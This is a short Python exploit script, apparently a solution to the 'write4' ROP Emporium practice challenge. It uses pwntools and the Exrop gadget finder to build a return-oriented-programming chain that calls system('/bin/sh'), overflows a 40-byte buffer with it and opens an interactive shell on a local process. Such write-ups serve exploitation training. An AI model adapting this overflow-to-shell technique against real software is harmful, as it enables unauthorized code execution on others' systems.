from Exrop import Exrop
from pwn import *

binname = "write4"
rop = Exrop(binname)
rop.find_gadgets(cache=True)
elf = ELF(binname, checksec=False)
bss = elf.bss()
system = elf.symbols['system']
chain = rop.func_call(system, ("/bin/sh",), elf.bss())
chain.dump()
ret = p64(0x0000000000400806) # for padding
buf = b"A"*40
buf += ret + chain.payload_str() # ret for padding
p = process(binname)
p.sendlineafter("> ", buf)
p.interactive()
